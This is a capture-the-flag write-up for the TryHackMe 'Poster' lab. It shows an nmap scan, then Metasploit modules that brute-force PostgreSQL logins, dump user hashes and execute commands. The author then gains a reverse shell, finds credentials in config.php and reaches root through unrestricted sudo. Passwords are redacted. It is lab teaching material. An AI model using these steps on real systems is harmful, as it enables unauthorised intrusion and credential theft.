
[TryHackMe Link](https://tryhackme.com/room/poster){ .md-button }

!!! example "Description"

    <p id="desc" style="font-size:15px"></p>

## <b>Scanning</b>

* Assigned IP address: &nbsp; <b id="ip" style="color:purple"></b>
  
* Open Ports: 

| <p style="font-size:14px; color: black">PORT</p>      | <p style="font-size:14px; color: black">SERVICE</p> |  <p style="font-size:14px; color: black">DESCRIPTION                          |
| :---------: | :---------: | :----------------------------------: |
| <p id="p1" style="font-size:14px; color: purple"></p>      | <p id="s1" style="font-size:14px; color: purple"></p>  |<p id="d1" style="font-size:14px; color: purple"></p>   |
| <p id="p2" style="font-size:14px;  color: purple"></p>     | <p id="s2" style="font-size:14px; color: purple"></p>  |<p id="d2" style="font-size:14px; color: purple"></p> |
| <p id="p3" style="font-size:14px;  color: purple"></p>     | <p id="s3" style="font-size:14px; color: purple"></p>  |<p id="d3" style="font-size:14px; color: purple"></p> |


* Nmap Report:
  ```s linenums="1" hl_lines="6 11 14"
    # Nmap 7.93 scan initiated Tue Feb 28 11:10:13 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.219.185
    Nmap scan report for 10.10.219.185
    Host is up (0.15s latency).
    Not shown: 997 closed tcp ports (reset)
    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 71ed48af299e30c1b61dffb024cc6dcb (RSA)
    |   256 eb3aa34e6f1000abeffcc52b0edb4057 (ECDSA)
    |_  256 3e4142353805d392eb4939c6e3ee78de (ED25519)
    80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Poster CMS
    5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
    | ssl-cert: Subject: commonName=ubuntu
    | Not valid before: 2020-07-29T00:54:25
    |_Not valid after:  2030-07-27T00:54:25
    |_ssl-date: TLS randomness does not represent time
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.93%E=4%D=2/28%OT=22%CT=1%CU=31038%PV=Y%DS=5%DC=I%G=Y%TM=63FDDA2
    OS:9%P=aarch64-unknown-linux-gnu)SEQ(SP=100%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS
    OS:=8)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M
    OS:505ST11NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68
    OS:DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=
    OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q
    OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A
    OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y
    OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T
    OS:=40%CD=S)

    Network Distance: 5 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Tue Feb 28 05:40:41 2023 -- 1 IP address (1 host up) scanned in -19771.18 seconds

  ```

## <b>Task Questions</b>

- [x] What is the rdbms installed on the server?

    * Based on the nmap results, its **`postgresql`**

- [x] What port is the rdbms running on?

    * Based on the nmap results, its **`5432`**

- [x] After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?

    * type the command: **`msfconfole -q`** (This opens in silent mode)
    * To explicitly search auxiliary modules, you can use the following command: 
      
      &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; **`msf6 > search type:auxiliary postgres sql`**

      ```sql
        Matching Modules
        ================

        #  Name                                                       Disclosure Date  Rank    Check  Description
        -  ----                                                       ---------------  ----    -----  -----------
        0  auxiliary/server/capture/postgresql                                         normal  No     Authentication Capture: PostgreSQL
        1  auxiliary/admin/http/manageengine_pmp_privesc              2014-11-08       normal  Yes    ManageEngine Password Manager SQLAdvancedALSearchResult.cc Pro SQL Injection
        2  auxiliary/analyze/crack_databases                                           normal  No     Password Cracker: Databases
        3  auxiliary/scanner/postgres/postgres_dbname_flag_injection                   normal  No     PostgreSQL Database Name Command Line Flag Injection
        4  auxiliary/scanner/postgres/postgres_login                                   normal  No     PostgreSQL Login Utility
        5  auxiliary/admin/postgres/postgres_readfile                                  normal  No     PostgreSQL Server Generic Query
        6  auxiliary/admin/postgres/postgres_sql                                       normal  No     PostgreSQL Server Generic Query
        7  auxiliary/scanner/postgres/postgres_version                                 normal  No     PostgreSQL Version Probe
        8  auxiliary/admin/http/rails_devise_pass_reset               2013-01-28       normal  No     Ruby on Rails Devise Authentication Password Reset
      ```

    * Based on the above results, its **`auxiliary/scanner/postgres/postgres_login`**

- [x] What are the credentials you found? example: user:password

    * `use` `auxiliary/scanner/postgres/postgres_login`
    * `set` `RHOSTS` `10.10.219.185`
    
    ```sql linenums="1" hl_lines="11"
    msf6 auxiliary(scanner/postgres/postgres_login) > run
    [!] No active DB -- Credential data will not be saved!
    [-] 10.10.219.185:5432 - LOGIN FAILED: :@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: :tiger@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: :postgres@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: :password@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: :admin@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: postgres:@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: postgres:tiger@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: postgres:postgres@template1 (Incorrect: Invalid username or password)
    [+] 10.10.219.185:5432 - Login Successful: postgres:[REDACTED]@[REDACTED]
    [-] 10.10.219.185:5432 - LOGIN FAILED: scott:@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: scott:tiger@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: scott:postgres@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: scott:password@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: scott:admin@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:tiger@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:postgres@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:admin@template1 (Incorrect: Invalid username or password)
    [-] 10.10.219.185:5432 - LOGIN FAILED: admin:password@template1 (Incorrect: Invalid username or password)
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```

- [x] Based on the results of #6, what is the rdbms version installed on the server?
  
    * `use` `auxiliary/admin/postgres/postgres_sql`
    * `set` `PASSWORD` `[REDACTED]`

    ```sql linenums="1" hl_lines="9"
    msf6 auxiliary(admin/postgres/postgres_sql) > run
    [*] Running module against 10.10.219.185

    Query Text: 'select version()'
    ==============================

        version
        -------
        PostgreSQL [REDACTED] on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bi
        t

    [*] Auxiliary module execution completed
    ```


- [x] What is the full path of the module that allows for dumping user hashes (starting with auxiliary)? How many user hashes does the module dump? 
  
    * msf6 > `search type:auxiliary postgres hash`
    * `use` `auxiliary/scanner/postgres/postgres_hashdump`
    * `set` `PASSWORD` `[REDACTED]`
    * `set` `DATABASE` `[REDACTED]`

    ```sql linenums="1" hl_lines="13-18"
    msf6 auxiliary(scanner/postgres/postgres_hashdump) > setg PASSWORD [REDACTED]
    PASSWORD => [REDACTED]
    msf6 auxiliary(scanner/postgres/postgres_hashdump) > set DATABASE [REDACTED]
    DATABASE => [REDACTED]
    msf6 auxiliary(scanner/postgres/postgres_hashdump) > run

    [+] Query appears to have run successfully
    [+] Postgres Server Hashes
    ======================

    Username   Hash
    --------   ----
    darkstart  [REDACTED]
    poster     [REDACTED]
    postgres   [REDACTED]
    sistemas   [REDACTED]
    ti         [REDACTED]
    tryhackme  [REDACTED]

    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    ```
- [x] What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?
  
    * msf6 > `search type:auxiliary postgres`
    * Based on metasploit search results, its: `auxiliary/admin/postgres/postgres_readfile`

- [x] What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?

     * msf6 > `search type:exploit postgres`
     * Based on metasploit search results, its: `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`


!!! success "Tip"

    <span>To specify a value globally, such as RHOST or LHOST, in msfconsole, use the **setg** command instead of the **set** command. This eliminates the need to retype the value.</span>

    ```s
    setg RHOST 10.10.219.185
    setg LHOST 10.17.3.217
    ```


## <b>Exploitation</b>

To exploit the system, I ran `exploit/multi/postgres/postgres_copy_from_program_cmd_exec` with the necessary options. 

<img id="image1" />

Once the exploit was successful, I stabilized the system by establishing a reverse shell. The current user was **postgres** on hostname 'Ubuntu'.

## <b>Privilege Escalation</b>

### <b>Gaining user access (Dark)</b>

To escalate privileges, I explored the files in both user accounts Alison and Dark. I discovered that Dark had credentials for his own account. 

<img id="image2" />

### <b>Gaining user access (Alison)</b>

After accessing dark's account using SSH, I ran the linpeas.sh script to determine the security posture of the `dark` user. Meanwhile, I learned that `dark` and others had write access to **`/var/www/html/config.php.`**

<img id="image3" />

Upon investigating, I discovered the credentials for **alison** and, through his account, found the first flag.

```php
<?php 

        $dbhost = "127.0.0.1";
        $dbuname = "alison";
        $dbpass = "[REDACTED]";
        $dbname = "[REDACTED]";
```

<img id="image4" />

### <b>Gaining root access</b>

Subsequently, upon accessing alison's account, I enumerated the sudo powers of alison using the command **sudo -l**

```sh
#!/bin/bash
alison@ubuntu:/home/dark$ sudo -l
[sudo] password for alison: 
Matching Defaults entries for alison on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL
```

Since, It allows all commands to run as sudo, it was an easy task. I accessed my root flag by just typing `sudo /bin/bash`.


<script>

// JSON object
const data = {
    "desc": "The sys admin set up a rdbms in a safe way. Most commercially available RDBMSs currently use Structured Query Language (SQL) to access the database. RDBMS structures are most commonly used to perform CRUD operations (create, read, update, and delete), which are critical to support consistent data management. Are you able to complete the challenge?",
    "ip":  "10.10.219.185",
    "ports": "22/tcp,ssh,OpenSSH 7.2p2 Ubuntu 4ubuntu2.10;80/tcp,http,Apache httpd 2.4.18;5432/tcp,postgresql,PostgreSQL",
    "difficulty":"easy",
    "id": "8"
}


function updateHTML() {

    const keys = Object.keys(data);
    const values = Object.values(data);

    for(var z=0; z < keys.length; z++){

        if(keys[z] === "ports"){
            const ports = data.ports.split(';');
            for(var i = 0; i < ports.length; i++){
                document.getElementById("p"+(i+1)).innerHTML = ports[i].split(',')[0].toUpperCase();
                document.getElementById("s"+(i+1)).innerHTML = ports[i].split(',')[1].toUpperCase();
                document.getElementById("d"+(i+1)).innerHTML = ports[i].split(',')[2];
            }
        }
        else{
            try{
            document.getElementById(keys[z]).innerHTML = values[z];
            }
            catch(error){
                console.log(values[z]);
            }
        }
    }

    // replace the values with your specific filenames and number of images and img tags
    const numImgTags = document.getElementsByTagName('img').length;

    for (let i = 1; i <= numImgTags; i++) {
    const imgTag = document.getElementById('image' + i);
        if (imgTag) {
            imgTag.src = '../images/'+data.difficulty[0]+data.id+'-image' + i + '.png';
        }
    }


}

updateHTML();
</script>